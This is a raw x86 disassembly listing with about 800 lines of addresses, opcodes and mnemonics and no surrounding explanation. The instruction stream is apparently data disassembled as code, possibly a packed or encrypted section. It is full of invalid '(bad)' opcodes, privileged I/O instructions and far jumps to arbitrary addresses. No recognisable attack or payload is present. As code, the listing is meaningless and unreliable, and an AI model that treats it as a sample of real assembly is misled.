  402914:	sbb    DWORD PTR [ecx-0x13dad6ac],esi
  40291a:	in     eax,0xfb
  40291c:	push   ecx
  40291d:	add    esi,DWORD PTR [edi+0x58457c6a]
  402923:	xor    eax,0x761d5f73
  402928:	or     bh,ch
  40292a:	rcr    BYTE PTR [ebx],0x33
  40292d:	fcmovne st,st(6)
  40292f:	iret   
  402930:	jbe    0x4028f4
  402932:	retf   0xc4d7
  402935:	mov    DWORD PTR [ecx+0x47],esi
  402938:	(bad)
  40293b:	jge    0x402938
  40293d:	mov    cl,0x7d
  40293f:	xchg   edi,eax
  402940:	outs   dx,BYTE PTR ds:[esi]
  402941:	out    0x65,al
  402943:	ret    
  402944:	lds    edx,FWORD PTR [esi]
  402946:	xor    al,0x4d
  402948:	ds ror dl,cl
  40294b:	pop    ds
  40294c:	shl    DWORD PTR [esp+eax*4-0x69ba42c9],cl
  402953:	push   esi
  402954:	bound  ebp,QWORD PTR [ecx-0xac78e58]
  40295a:	(bad)  
  40295b:	ror    BYTE PTR [esi],1
  40295d:	bound  eax,QWORD PTR [ebx+0x49]
  402960:	push   ds
  402961:	mov    ah,BYTE PTR [edi]
  402963:	jmp    0xcf6eac6c
  402968:	or     BYTE PTR [ebx],dl
  40296a:	pop    ebp
  40296b:	test   DWORD PTR [ebp-0x6c],edx
  40296e:	xor    bl,BYTE PTR [eax]
  402970:	push   0x831b38d4
  402975:	in     eax,dx
  402976:	or     esp,eax
  402978:	adc    BYTE PTR [eax+ebp*2],dh
  40297b:	jl     0x4029ea
  40297d:	test   bl,0xe5
  402980:	dec    edx
  402981:	sbb    DWORD PTR [esi+0x1f],edi
  402984:	and    eax,0x5d2482df
  402989:	jmp    0xc8a0:0x215b2787
  402990:	pop    edx
  402991:	(bad)  [eax-0x6dc10ddd]
  402997:	add    eax,0x6770ba10
  40299c:	ins    DWORD PTR es:[edi],dx
  40299d:	mov    ds:0x3c7cc8ed,eax
  4029a2:	jle    0x402a09
  4029a4:	dec    ecx
  4029a5:	mov    ebp,0x77312a82
  4029aa:	cs int 0x1c
  4029ad:	stc    
  4029ae:	cwde   
  4029af:	adc    ebx,eax
  4029b1:	rol    BYTE PTR [ecx+0x65844904],cl
  4029b7:	icebp  
  4029b8:	loopne 0x40295c
  4029ba:	sub    BYTE PTR [edi],cl
  4029bc:	aaa    
  4029bd:	cdq    
  4029be:	xchg   ebp,eax
  4029bf:	sub    al,0x7e
  4029c1:	test   al,0xa3
  4029c3:	repz jae 0x4029a6
  4029c6:	pusha  
  4029c7:	call   0x5de8:0x3cf6ff3c
  4029ce:	retf   
  4029cf:	fwait
  4029d0:	ret    
  4029d1:	sub    DWORD PTR [edx],esp
  4029d3:	jo     0x402a0f
  4029d5:	mov    ?,WORD PTR [esi-0x37]
  4029d8:	jns    0x402a1d
  4029da:	cs jae 0x4029df
  4029dd:	ror    ch,cl
  4029df:	das    
  4029e0:	or     al,0x53
  4029e2:	cli    
  4029e3:	mov    cl,cl
  4029e5:	adc    DWORD PTR [ebp+0x26390d96],ecx
  4029eb:	addr16 leave 
  4029ed:	daa    
  4029ee:	inc    edx
  4029ef:	xchg   DWORD PTR [ecx],esp
  4029f1:	les    esi,FWORD PTR gs:[ecx-0x47]
  4029f5:	cmp    al,0x52
  4029f7:	or     eax,0x47e6b634
  4029fc:	xchg   edx,eax
  4029fd:	call   0x28ec:0x2ca68ec9
  402a04:	nop
  402a05:	inc    ebx
  402a06:	sub    bl,BYTE PTR [esi+ecx*2-0x35d84319]
  402a0d:	test   ah,cl
  402a0f:	into   
  402a10:	xor    eax,0x5097bc5b
  402a15:	fld    TBYTE PTR [ebx-0x1e77ce15]
  402a1b:	call   0xa6b1f0c7
  402a20:	or     al,0x1e
  402a22:	and    BYTE PTR [esi+0x7b],cl
  402a25:	(bad)  
  402a26:	pop    ebx
  402a27:	cmp    eax,0xdd8aabde
  402a2c:	push   edx
  402a2d:	ds mov edi,0x2ea7635
  402a33:	sbb    DWORD PTR [ecx+0x57a17d1c],edi
  402a39:	cwde   
  402a3a:	cmp    ebx,DWORD PTR gs:[edx-0x6908ad04]
  402a41:	push   edi
  402a42:	pop    ss
  402a43:	push   ebp
  402a44:	fiadd  DWORD PTR [edi+ecx*2-0x68056d4c]
  402a4b:	cwde   
  402a4c:	jle    0x402a5f
  402a4e:	push   esp
  402a4f:	pop    ebp
  402a50:	sbb    ecx,edx
  402a52:	mov    edx,0xb0013622
  402a57:	popa   
  402a58:	int3   
  402a59:	dec    ebx
  402a5a:	js     0x4029ec
  402a5c:	adc    bl,BYTE PTR [eax+0x2f6fe922]
  402a62:	add    ecx,0x78
  402a65:	and    eax,esi
  402a67:	xor    bl,BYTE PTR [ecx]
  402a69:	test   BYTE PTR [edi-0x78],ah
  402a6c:	int    0xe
  402a6e:	push   ecx
  402a6f:	outs   dx,DWORD PTR ds:[esi]
  402a70:	pushf  
  402a71:	dec    ebx
  402a72:	push   esp
  402a73:	cmp    al,0x83
  402a75:	xchg   BYTE PTR [ecx-0xf],dl
  402a78:	pusha  
  402a79:	es dec ecx
  402a7b:	cmp    eax,0xfd402551
  402a80:	int    0xd8
  402a82:	mov    edi,0x4d51cfa1
  402a87:	mov    ebp,0x59483952
  402a8c:	inc    esi
  402a8d:	mov    DWORD PTR [ecx+0x62],edi
  402a90:	add    BYTE PTR [edx],ch
  402a92:	and    eax,0x825c5050
  402a97:	call   DWORD PTR [ebx+0x53]
  402a9a:	xchg   DWORD PTR [ecx],ebp
  402a9c:	xor    BYTE PTR [edi+0x1cac3643],0xe
  402aa3:	cmp    al,0x3b
  402aa5:	pop    ss
  402aa6:	repnz sub al,0x83
  402aa9:	jl     0x402acd
  402aab:	sub    esp,DWORD PTR [esi+0x3b]
  402aae:	test   DWORD PTR ds:0x75a29a71,edi
  402ab4:	test   BYTE PTR [edi+eiz*8],ch
  402ab7:	jle    0x402aeb
  402ab9:	lods   al,BYTE PTR ds:[esi]
  402aba:	xchg   ebx,eax
  402abb:	ficomp WORD PTR [edx+0x39ae9eab]
  402ac1:	clc    
  402ac2:	ins    DWORD PTR es:[edi],dx
  402ac3:	cwde   
  402ac4:	or     eax,0x4e3bb870
  402ac9:	mov    ds:0x80789cd3,al
  402ace:	mov    ds:0x65e555ef,eax
  402ad3:	sbb    al,0x88
  402ad5:	mov    esp,ebp
  402ad7:	in     eax,dx
  402ad8:	ret    0x1c1f
  402adb:	retf   0x1b2d
  402ade:	ret    
  402adf:	ret    
  402ae0:	push   esp
  402ae1:	fidivr WORD PTR [ecx+ebp*2+0x4f662777]
  402ae8:	push   ecx
  402ae9:	iret   
  402aea:	(bad)  
  402aeb:	mov    esp,0xcd4c5f9b
  402af0:	pop    esp
  402af1:	pop    eax
  402af2:	pop    eax
  402af3:	stos   BYTE PTR es:[edi],al
  402af4:	test   eax,0x65f40430
  402af9:	add    al,0x26
  402afb:	sub    eax,0xa35182a6
  402b00:	push   cs
  402b01:	jmp    0x83e477f0
  402b06:	mov    esp,0xae499116
  402b0b:	xor    ch,BYTE PTR [edi+0x369cfb38]
  402b11:	jle    0x402b49
  402b13:	ficomp WORD PTR [esi]
  402b15:	cld    
  402b16:	outs   dx,DWORD PTR ds:[esi]
  402b17:	mov    al,ds:0xb25a8c41
  402b1c:	call   0xccb49455
  402b21:	sbb    ch,BYTE PTR [ebp-0x20817616]
  402b27:	or     dl,BYTE PTR [edi]
  402b29:	xlat   BYTE PTR ds:[bx]
  402b2b:	loope  0x402b51
  402b2d:	into   
  402b2e:	aam    0xa0
  402b30:	pop    edi
  402b31:	neg    BYTE PTR [esi-0x3b]
  402b34:	out    dx,al
  402b35:	push   ebp
  402b36:	and    DWORD PTR [eax],esi
  402b38:	in     al,dx
  402b39:	sbb    al,BYTE PTR [eax+edi*4]
  402b3c:	retf   
  402b3d:	ja     0x402b71
  402b3f:	adc    DWORD PTR [edx-0x77],eax
  402b42:	pop    esi
  402b43:	lahf   
  402b44:	xor    eax,0x8968ce71
  402b49:	shr    bh,cl
  402b4b:	fldcw  WORD PTR [edx+0x6]
  402b4e:	xor    edi,DWORD PTR ds:0xf84e04ec
  402b54:	sub    esi,DWORD PTR [ecx]
  402b56:	stc    
  402b57:	je     0x402bba
  402b59:	pop    esp
  402b5a:	(bad)  
  402b5b:	mov    ecx,0xdccb6824
  402b60:	xchg   edi,eax
  402b61:	adc    DWORD PTR [eax],esi
  402b63:	jne    0x402b6c
  402b65:	lahf   
  402b66:	add    eax,0x709514d
  402b6b:	and    edx,DWORD PTR [ecx-0x416bea4a]
  402b71:	fldcw  WORD PTR [edi-0xbee0c51]
  402b77:	pusha  
  402b78:	shl    ecx,1
  402b7a:	dec    ebx
  402b7b:	sbb    BYTE PTR [edi+0x789dd069],ch
  402b81:	push   ebx
  402b82:	stos   DWORD PTR es:[edi],eax
  402b83:	dec    esi
  402b84:	mul    esi
  402b86:	push   eax
  402b87:	retf   
  402b88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b89:	fsubp  st(1),st
  402b8b:	inc    edx
  402b8c:	pop    esp
  402b8d:	ficomp DWORD PTR [edi+0x3d]
  402b90:	call   0xe98e:0x7d6064a
  402b97:	mov    bl,BYTE PTR ds:0x7321743b
  402b9d:	dec    eax
  402b9e:	push   eax
  402b9f:	in     eax,dx
  402ba0:	dec    eax
  402ba1:	cmc    
  402ba2:	and    eax,0xb2533b20
  402ba7:	xchg   esp,eax
  402ba8:	cld    
  402ba9:	in     al,0x1e
  402bab:	outs   dx,BYTE PTR ds:[si]
  402bad:	int3   
  402bae:	ret    0x2ee4
  402bb1:	xlat   BYTE PTR ds:[ebx]
  402bb2:	pop    ds
  402bb3:	mov    ds:0x990ef872,al
  402bb8:	push   esi
  402bb9:	add    ebx,edx
  402bbb:	jne    0x402c2f
  402bbd:	jnp    0x402b54
  402bbf:	dec    edi
  402bc0:	int    0x6d
  402bc2:	jecxz  0x402bda
  402bc4:	push   esi
  402bc5:	ja     0x402bc9
  402bc7:	push   ebx
  402bc8:	out    0x49,eax
  402bca:	adc    BYTE PTR [ecx],al
  402bcc:	cwde   
  402bcd:	jle    0x402bc1
  402bcf:	scas   al,BYTE PTR es:[edi]
  402bd0:	and    BYTE PTR ds:0xace7c6a9,ch
  402bd6:	nop
  402bd7:	imul   ebx,ebp,0x5a
  402bda:	mov    cs,esp
  402bdc:	push   edx
  402bdd:	ja     0x402c4a
  402bdf:	mov    edi,0x5bb3961e
  402be4:	add    BYTE PTR [edx-0x38],ah
  402be7:	les    ebx,FWORD PTR [esi]
  402be9:	xor    eax,0x8e10a110
  402bee:	pushf  
  402bef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bf0:	aaa    
  402bf1:	adc    ch,BYTE PTR ds:0x7610d3b0
  402bf7:	pusha  
  402bf8:	jp     0x402b95
  402bfa:	icebp  
  402bfb:	or     eax,0x8c37dd16
  402c00:	fist   WORD PTR [ecx-0x39]
  402c03:	in     eax,dx
  402c04:	(bad)  
  402c05:	xchg   ebp,eax
  402c06:	and    bl,BYTE PTR [esi-0x6ab7389c]
  402c0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c0d:	add    eax,0x4921d8b0
  402c12:	xchg   DWORD PTR [edx+edx*1-0x19bb34c],esp
  402c19:	dec    esi
  402c1a:	push   ecx
  402c1b:	cmc    
  402c1c:	int    0x1
  402c1e:	adc    DWORD PTR [ecx],edx
  402c20:	push   es
  402c21:	add    BYTE PTR [ecx-0x3d],dl
  402c24:	sub    DWORD PTR [edi],edi
  402c26:	inc    ebx
  402c27:	add    eax,0x8f07720d
  402c2c:	inc    ebp
  402c2d:	(bad)  
  402c2e:	sub    al,0xc
  402c30:	ins    DWORD PTR es:[edi],dx
  402c31:	and    dh,BYTE PTR [ebp+0x45f8afce]
  402c37:	jo     0x402c27
  402c39:	test   DWORD PTR [ecx-0x5],esp
  402c3c:	and    ebx,edx
  402c3e:	mov    BYTE PTR ds:0xa3f2b997,bh
  402c44:	or     al,0x6f
  402c46:	call   0xaf42ce52
  402c4b:	jmp    0x402c1d
  402c4d:	sub    esp,0x18
  402c50:	push   edi
  402c51:	inc    esp
  402c52:	sbb    eax,0xc52aaa3
  402c57:	and    ebp,esi
  402c59:	fnstsw WORD PTR [ebp+0x120ee499]
  402c5f:	xchg   edx,eax
  402c60:	(bad)  
  402c62:	fdivr  DWORD PTR [edx]
  402c64:	ins    DWORD PTR es:[edi],dx
  402c65:	ss push ebx
  402c67:	add    BYTE PTR [edi-0x55],cl
  402c6a:	mov    cs,WORD PTR [edx+0x24c21e51]
  402c70:	stos   BYTE PTR es:[edi],al
  402c71:	add    ch,0x7f
  402c74:	dec    esp
  402c75:	outs   dx,BYTE PTR ds:[esi]
  402c76:	inc    ebp
  402c77:	push   edi
  402c78:	shl    DWORD PTR [edi+0x3c],0x99
  402c7c:	leave  
  402c7d:	mov    ch,0xb5
  402c7f:	push   0x71
  402c81:	mov    ecx,0xc1c213ed
  402c86:	fadd   QWORD PTR [ebp-0x67]
  402c89:	mov    ch,0x89
  402c8b:	mov    esi,0x5d278e37
  402c90:	test   BYTE PTR [edi-0x38],0xf3
  402c94:	sti    
  402c95:	push   0x1d
  402c97:	pop    ecx
  402c98:	push   0x36
  402c9a:	clc    
  402c9b:	mov    edx,es
  402c9d:	cmc    
  402c9e:	fcomi  st,st(2)
  402ca0:	imul   edx,DWORD PTR [ecx-0x5d05cae6],0x2d18ff1e
  402caa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cab:	jbe    0x402ca0
  402cad:	or     edi,DWORD PTR [edi-0xbbbfb33]
  402cb3:	sub    edx,DWORD PTR [esi]
  402cb5:	lds    edx,FWORD PTR [edx-0x508db6df]
  402cbb:	call   0xef8f:0x769725d0
  402cc2:	enter  0xf85f,0x35
  402cc6:	dec    esi
  402cc7:	cmp    ecx,DWORD PTR [ecx]
  402cc9:	shl    BYTE PTR [ecx],0xab
  402ccc:	in     al,dx
  402ccd:	fisttp QWORD PTR [edi]
  402ccf:	sbb    edi,edi
  402cd1:	push   0xffffff85
  402cd3:	je     0x402cc3
  402cd5:	mov    bl,0xbb
  402cd7:	push   cs
  402cd8:	or     DWORD PTR [edx+0xa],ecx
  402cdb:	xchg   ecx,eax
  402cdc:	leave  
  402cdd:	adc    al,0x39
  402cdf:	in     eax,0x4
  402ce1:	cmp    bl,ah
  402ce3:	sbb    ah,BYTE PTR [esi]
  402ce5:	push   ss
  402ce6:	ins    DWORD PTR es:[edi],dx
  402ce7:	div    DWORD PTR [ecx+0x2f3ce58c]
  402ced:	out    0x25,eax
  402cef:	sbb    al,0x3d
  402cf1:	dec    ebx
  402cf2:	outs   dx,BYTE PTR gs:[esi]
  402cf4:	adc    ah,BYTE PTR [ecx]
  402cf6:	call   0x3d1d:0xdc0626ae
  402cfd:	mov    edx,0x2c787b43
  402d02:	in     eax,0xd0
  402d04:	mov    ds:0x26b69dfe,al
  402d09:	hlt    
  402d0a:	fdivrp st(6),st
  402d0c:	pop    esi
  402d0d:	mov    ah,0xf3
  402d0f:	test   eax,0x96ece8c5
  402d14:	dec    edi
  402d15:	adc    BYTE PTR [edi],ah
  402d17:	push   0xffffffca
  402d19:	pop    ebx
  402d1a:	stos   BYTE PTR es:[edi],al
  402d1b:	aad    0x39
  402d1d:	les    edi,FWORD PTR fs:[edx-0x31]
  402d21:	ins    BYTE PTR es:[edi],dx
  402d22:	push   ds
  402d23:	(bad)  
  402d24:	sbb    eax,0x2cb5391b
  402d29:	jp     0x402cad
  402d2b:	imul   ebx,DWORD PTR ds:0xd4f2c396,0x16
  402d32:	in     eax,dx
  402d33:	mov    eax,0xfdad2e79
  402d38:	cmp    esi,DWORD PTR [esi-0x74108cab]
  402d3e:	push   esp
  402d3f:	hlt    
  402d40:	lods   eax,DWORD PTR ds:[esi]
  402d41:	test   DWORD PTR [edx+0x21b51761],ecx
  402d47:	std    
  402d48:	in     eax,0x71
  402d4a:	jnp    0x402d91
  402d4c:	sub    al,0x71
  402d4e:	rol    DWORD PTR [esi-0x1f],cl
  402d51:	jns    0x402d64
  402d53:	jae    0x402d1b
  402d55:	add    ebx,ecx
  402d57:	push   edx
  402d58:	mov    esp,0x83ff77cd
  402d5d:	popa   
  402d5e:	inc    ecx
  402d5f:	push   0xffffffcb
  402d61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d62:	popa   
  402d63:	add    DWORD PTR ds:0xf9aa20f,eax
  402d69:	stc    
  402d6a:	mov    cl,0x2d
  402d6c:	inc    edx
  402d6d:	mov    edi,ebp
  402d6f:	xchg   ebp,eax
  402d70:	cmp    eax,0xd378b026
  402d75:	mov    gs,WORD PTR [ebx-0x3b]
  402d78:	mov    DWORD PTR [edi+eax*2+0x52],eax
  402d7c:	inc    ebp
  402d7d:	inc    ebp
  402d7e:	dec    ecx
  402d7f:	dec    eax
  402d80:	stos   BYTE PTR es:[edi],al
  402d81:	jmp    0xa6a5:0xdae396cd
  402d88:	mov    edi,0xbff19d6d
  402d8d:	and    al,0x6e
  402d8f:	fneni(8087 only) 
  402d91:	aas    
  402d92:	mov    esp,0xb81ecb84
  402d97:	es out 0xc9,al
  402d9a:	push   ds
  402d9b:	aam    0x58
  402d9d:	dec    esi
  402d9e:	xchg   esp,eax
  402d9f:	push   ss
  402da0:	bound  eax,QWORD PTR [eax+0x1f]
  402da3:	jae    0x402e12
  402da5:	mov    edx,0x8436c7c5
  402daa:	rol    edi,0x2f
  402dad:	es pop ss
  402daf:	push   eax
  402db0:	adc    al,0x70
  402db2:	mov    DWORD PTR cs:[esi+0x5b298726],esp
  402db9:	sar    BYTE PTR [esi+0x29],cl
  402dbc:	scas   eax,DWORD PTR es:[edi]
  402dbd:	xchg   dl,ch
  402dbf:	xchg   esi,eax
  402dc0:	dec    eax
  402dc1:	mov    esp,DWORD PTR es:[esi]
  402dc4:	cmp    ebp,edx
  402dc6:	push   edx
  402dc7:	loopne 0x402de6
  402dc9:	xor    BYTE PTR [ebp+ecx*8-0x250be4c5],0x67
  402dd1:	dec    esp
  402dd2:	and    ah,BYTE PTR [ebp-0x75]
  402dd5:	xor    al,0x72
  402dd7:	sbb    al,0x7f
  402dd9:	ins    DWORD PTR es:[edi],dx
  402dda:	stos   DWORD PTR es:[edi],eax
  402ddb:	pop    ecx
  402ddc:	in     eax,0x5
  402dde:	std    
  402ddf:	push   0x1d
  402de1:	popa   
  402de2:	mov    ah,0x7f
  402de4:	inc    esp
  402de5:	cld    
  402de6:	sbb    ah,BYTE PTR [bx+0x64]
  402dea:	pop    ebx
  402deb:	push   edx
  402dec:	or     ch,BYTE PTR [edi+edi*1-0x726a3f07]
  402df3:	push   0x38
  402df5:	sub    dh,dl
  402df7:	push   ds
  402df8:	je     0x402e3c
  402dfa:	mov    bl,0x3c
  402dfc:	mov    ebx,DWORD PTR [ebx-0x209f701c]
  402e02:	gs lock jns 0x402de9
  402e06:	sbb    ebp,DWORD PTR [ebx]
  402e08:	in     al,dx
  402e09:	(bad)  
  402e0a:	int3   
  402e0b:	data16 icebp 
  402e0d:	xchg   ebp,eax
  402e0e:	imul   esi,DWORD PTR [ebx+0x6d04faac],0x72
  402e15:	cmp    bh,BYTE PTR [ecx]
  402e17:	sbb    ebx,ecx
  402e19:	fistp  WORD PTR [ebx+0x26e3dd36]
  402e1f:	outs   dx,DWORD PTR ds:[esi]
  402e20:	push   edx
  402e21:	sbb    ebp,DWORD PTR [edx+0x497cbfb3]
  402e27:	pop    ss
  402e28:	lock mov al,0x58
  402e2b:	imul   ebx,DWORD PTR [ebx],0x64
  402e2e:	sbb    DWORD PTR [ecx-0x19],0x20
  402e32:	(bad)
  402e37:	sub    al,0x15
  402e39:	(bad)  
  402e3a:	(bad)  
  402e3b:	mov    eax,0xbd913038
  402e40:	xor    ebp,ebp
  402e42:	push   ebx
  402e43:	inc    esp
  402e44:	pusha  
  402e45:	push   eax
  402e46:	or     esi,esp
  402e48:	aad    0xc
  402e4a:	adc    DWORD PTR [ebp+0x12],0xffffff8f
  402e4e:	les    ecx,FWORD PTR [esi-0x24050dfb]
  402e54:	mov    ebp,0x3af15ec5
  402e59:	jp     0x402e93
  402e5b:	dec    ebp
  402e5c:	mov    cl,0x26
  402e5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e5f:	sub    ecx,DWORD PTR ss:[edx+0x12]
  402e63:	inc    eax
  402e64:	mov    dh,0x6d
  402e66:	jnp    0x402ed1
  402e68:	daa    
  402e69:	adc    DWORD PTR [esi+0x12],eax
  402e6c:	dec    esp
  402e6d:	push   cs
  402e6e:	imul   edi,DWORD PTR [edi-0x44],0x145615a4
  402e75:	pop    ss
  402e76:	and    bl,0xd1
  402e79:	pop    ss
  402e7a:	loope  0x402e98
  402e7c:	xchg   ecx,eax
  402e7d:	mov    ah,0x64
  402e7f:	dec    esi
  402e80:	leave  
  402e81:	jnp    0x402ebf
  402e83:	(bad)  
  402e84:	imul   ebp,DWORD PTR [edi],0xffffffc9
  402e87:	xchg   DWORD PTR [esi],edx
  402e89:	frstor [edx]
  402e8b:	in     al,0x68
  402e8d:	push   0xc642f951
  402e92:	pop    esp
  402e93:	ja     0x402e41
  402e95:	sub    bl,BYTE PTR [eax+0x3ed1f869]
  402e9b:	shr    DWORD PTR [esi+0x5],0xa6
  402e9f:	push   es
  402ea0:	and    BYTE PTR [ecx+0x6d],ch
  402ea3:	push   0x48e87706
  402ea8:	mov    ebx,0x45f89328
  402ead:	xchg   BYTE PTR [ecx],ah
  402eaf:	cmp    al,0xd1
  402eb1:	les    esi,FWORD PTR [ebx-0x70e302c0]
  402eb7:	dec    eax
  402eb8:	fld    QWORD PTR [edx+ebp*4+0x65]
  402ebc:	mov    BYTE PTR [esi],dl
  402ebe:	int3   
  402ebf:	aam    0x13
  402ec1:	je     0x402f3f
  402ec3:	les    esp,FWORD PTR [edi-0x7f57351b]
  402ec9:	ins    BYTE PTR es:[edi],dx
  402eca:	xchg   bl,dl
  402ecc:	inc    esp
  402ecd:	push   eax
  402ece:	or     bl,BYTE PTR [ebx-0x35919578]
  402ed4:	jp     0x402efe
  402ed6:	rcl    BYTE PTR [esi+0x4e],1
  402ed9:	xchg   esi,eax
  402eda:	lods   eax,DWORD PTR ds:[esi]
  402edb:	cs push ecx
  402edd:	imul   ecx,DWORD PTR [esi+0x628f31f9],0xffffffa6
  402ee4:	loop   0x402ed7
  402ee6:	or     al,0xb8
  402ee8:	add    ecx,DWORD PTR [ecx-0x1d]
  402eeb:	lods   al,BYTE PTR cs:[esi]
  402eed:	inc    esp
  402eee:	adc    al,0x22
  402ef0:	(bad)  
  402ef1:	hlt    
  402ef2:	cdq    
  402ef3:	leave  
  402ef4:	shl    DWORD PTR [esi],1
  402ef6:	pop    ss
  402ef7:	xor    ah,BYTE PTR [eax]
  402ef9:	in     eax,0x4e
  402efb:	and    BYTE PTR [edi],cl
  402efd:	jecxz  0x402f5c
  402eff:	mov    edi,0x279a7191
  402f04:	xchg   ecx,eax
  402f05:	mov    bh,0xdb
  402f08:	lods   al,BYTE PTR ds:[esi]
  402f09:	stos   BYTE PTR es:[edi],al
  402f0a:	fld    DWORD PTR [ebx]
  402f0c:	mov    eax,ds:0xf769b59
  402f11:	hlt    
  402f12:	cmp    DWORD PTR [ebx-0x33c9d1fc],ebx
  402f18:	dec    edx
  402f19:	dec    esp
  402f1a:	jle    0x402ed1
  402f1c:	cmp    ebp,edx
  402f1e:	std    
  402f1f:	shl    DWORD PTR [ebx+0x5a354a9a],cl
  402f25:	das    
  402f26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f27:	sbb    DWORD PTR [ebx],0xffffff81
  402f2a:	shr    DWORD PTR [edi+0x3],cl
  402f2d:	mov    bh,0xa8
  402f2f:	sbb    eax,0x6e87b377
  402f34:	sbb    BYTE PTR [edi+eax*2],0x93
  402f38:	aam    0xdf
  402f3a:	cwde   
  402f3b:	jl     0x402ecc
  402f3d:	sbb    al,0xc0
  402f3f:	and    BYTE PTR [eax+ecx*1],al
  402f42:	in     al,dx
  402f43:	das    
  402f44:	fidivr WORD PTR [edx]
  402f46:	sub    BYTE PTR [edi+0x5fc5a60f],0x4d
  402f4d:	adc    ah,0xe5
  402f50:	adc    DWORD PTR [edi+0x69076a7f],edi
  402f56:	mov    ah,0x47
  402f58:	jmp    0xb053a044
  402f5d:	fwait
  402f5e:	idiv   bl
  402f60:	pop    ebx
  402f61:	mov    ds:0x9889a5ff,al
  402f66:	pop    esp
  402f67:	pushw  cs
  402f69:	ins    BYTE PTR es:[edi],dx
  402f6a:	pushf  
  402f6b:	sbb    esi,DWORD PTR [edx]
  402f6d:	addr16 in al,0x75
  402f70:	test   eax,0x84aa0bd
  402f75:	push   0x3e
  402f77:	stc    
  402f78:	adc    al,0x76
  402f7a:	fwait
  402f7b:	(bad)  
  402f7c:	out    0xc4,al
  402f7e:	psubusb mm7,QWORD PTR [edx+0x63bd0d5f]
  402f85:	or     DWORD PTR [ebx],0x18
  402f88:	add    edi,DWORD PTR [edi+0x37]
  402f8b:	fs inc edi
  402f8d:	sub    DWORD PTR [edx],edx
  402f8f:	loopne 0x402f19
  402f91:	sub    eax,0xfed0f300
  402f96:	sub    esp,DWORD PTR [ebx]
  402f98:	int    0xf8
  402f9a:	jo     0x402f52
  402f9c:	fs sbb ah,ch
  402f9f:	clc    
  402fa0:	jne    0x402fa7
  402fa2:	push   ebp
  402fa3:	jmp    FWORD PTR [edx]
  402fa5:	add    edx,DWORD PTR [eax+0x69]
  402fa8:	aaa    
  402fa9:	mov    bl,0x30
  402fab:	call   0xff754a22
  402fb0:	mov    ebx,0x284a4c31
  402fb5:	aam    0x1e
  402fb7:	cld    
  402fb8:	ret    0x9346
  402fbb:	call   0x2a0ef83d
  402fc0:	dec    ebx
  402fc1:	jo     0x40303a
  402fc3:	push   esi
  402fc4:	aad    0x9c
  402fc6:	cmp    DWORD PTR [edx+0x204265db],esi
  402fcc:	stos   DWORD PTR es:[edi],eax
  402fcd:	fbld   TBYTE PTR [ebx]
  402fcf:	pop    ss
  402fd0:	dec    edx
  402fd1:	int3   
  402fd2:	mov    ebp,0xb4d63379
  402fd7:	xchg   ebp,eax
  402fd8:	or     ebp,ebp
  402fda:	(bad)  
  402fdb:	jo     0x402fed
  402fdd:	jmp    0x402fe7
  402fdf:	cmp    edi,eax
  402fe1:	lahf   
  402fe2:	aas    
  402fe3:	pop    ebp
  402fe4:	outs   dx,BYTE PTR ds:[esi]
  402fe5:	adc    ch,dh
  402fe7:	pop    edx
  402fe8:	dec    ecx
  402fe9:	fidiv  DWORD PTR [ecx]
  402feb:	mov    al,ds:0x67d2b9a5
  402ff0:	dec    edx
  402ff1:	pop    esp
  402ff2:	inc    ebx
  402ff3:	push   cs
  402ff4:	leave  
  402ff5:	aaa    
  402ff6:	imul   esp,DWORD PTR [ebx],0xffffffe8
  402ff9:	cmp    ecx,DWORD PTR [ebx+0x76]
  402ffc:	mov    edi,0x6a4d39db
  403001:	and    BYTE PTR [edi],0xfd
  403004:	push   esi
  403005:	hlt    
  403006:	clc    
  403007:	mov    esp,0x871f9366
  40300c:	mov    eax,ds:0xae054c47
  403011:	outs   dx,DWORD PTR ds:[esi]
  403012:	mov    bh,0x24
  403014:	push   esp
  403015:	call   0x66b0:0xf961c9c4
  40301c:	dec    edx
  40301d:	ins    BYTE PTR es:[edi],dx
  40301e:	imul   esi,edi,0x71955510
  403024:	xchg   esp,eax
  403025:	inc    ebp
  403026:	sbb    ebp,DWORD PTR [esi]
  403028:	pop    ss
  403029:	inc    ebp
  40302a:	adc    edi,DWORD PTR [edi]
  40302c:	(bad)  
  40302d:	and    ebp,ecx
  40302f:	push   ebp
  403030:	xor    al,0x46
  403032:	sbb    cl,BYTE PTR [ecx+0x38]
  403035:	mov    ah,0x2e
  403037:	pop    ss
  403038:	inc    ebp
  403039:	fisttp QWORD PTR [edx-0x64]
  40303c:	(bad)  
  40303d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40303e:	inc    ebx
  40303f:	fnstsw WORD PTR [eax+edi*4-0x754b241]
  403046:	push   ebx
  403047:	retf   0x93e2
  40304a:	jo     0x40303b
  40304c:	ins    BYTE PTR es:[edi],dx
  40304d:	jge    0x403045
  40304f:	nop
  403050:	leave  
  403051:	jmp    DWORD PTR [ebp+ebp*8+0x52]
  403055:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403056:	push   eax
  403057:	sub    edi,DWORD PTR [ebp-0xb30a6e3]
  40305d:	div    esp
  40305f:	xor    al,BYTE PTR [eax]
  403061:	pop    eax
  403062:	inc    ebp
  403063:	mov    bh,0xf9
  403065:	add    ebp,esi
  403067:	or     eax,0x7489e01b
  40306c:	add    ah,BYTE PTR [edi-0x35d21c2d]
  403072:	cmp    ch,0x58
  403075:	scas   eax,DWORD PTR es:[edi]
  403076:	bound  ecx,QWORD PTR [edi]
  403078:	push   edx
  403079:	data16 sub BYTE PTR [ebx],bh
  40307c:	dec    eax
  40307d:	ret    
  40307e:	call   0x82030635
  403083:	repnz push ecx
  403085:	fild   WORD PTR [edi-0x4dbc37dd]
  40308b:	push   ebp
  40308c:	xor    BYTE PTR [ecx-0x179446a6],cl
  403092:	arpl   WORD PTR [edx-0x1802d682],ax
  403098:	push   eax
  403099:	test   eax,0xd29cf58a
  40309e:	imul   BYTE PTR [edi]
  4030a0:	xchg   eax,eax
  4030a2:	nop
  4030a3:	jae    0x40310b
  4030a5:	jmp    0x40309c
  4030a7:	mov    eax,0x665b19e6
  4030ac:	loope  0x403049
  4030ae:	push   ds
  4030af:	(bad)  
  4030b0:	mov    ds:0x73a61a33,eax
